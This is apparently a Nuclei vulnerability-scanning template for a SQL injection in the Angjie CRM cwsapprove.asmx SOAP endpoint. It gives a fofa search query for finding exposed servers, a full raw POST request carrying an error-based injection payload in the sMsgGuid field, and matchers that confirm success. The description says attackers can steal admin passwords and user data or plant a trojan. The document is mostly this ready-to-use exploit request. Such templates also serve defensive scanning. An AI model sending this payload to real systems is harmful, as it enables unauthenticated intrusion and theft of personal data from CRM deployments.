id: angjieCRM-cwsapprove_asmx-sql

info:
  name: 昂捷CRM cwsapprove.asmx SQL注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: body="/Scripts/EnjoyMsg.js"
    昂捷CRM cwsapprove.asmx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://mp.weixin.qq.com/s/mOSS9yGwDzOQVbrgLyPPeQ
  tags: sql injection

http:
  - raw:
      - |
        POST /EnjoyRMIS_WS/WS/Approve/cwsapprove.asmx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/EndBillApprove1"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <EndBillApprove1 xmlns="http://tempuri.org/">
              <sMsgGuid>' AND 9173 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (9173=9173) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(112)+CHAR(112)+CHAR(113))) AND 'rhYc'='rhYc</sMsgGuid>
              <sUserno>string</sUserno>
              <sEformDataIp>string</sEformDataIp>
            </EndBillApprove1>
          </soap:Body>
        </soap:Envelope>
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'qvkpq1qvppq'
          - '转换成数据类型 int 时失败'
        condition: and
      - type: status
        status: 
          - 500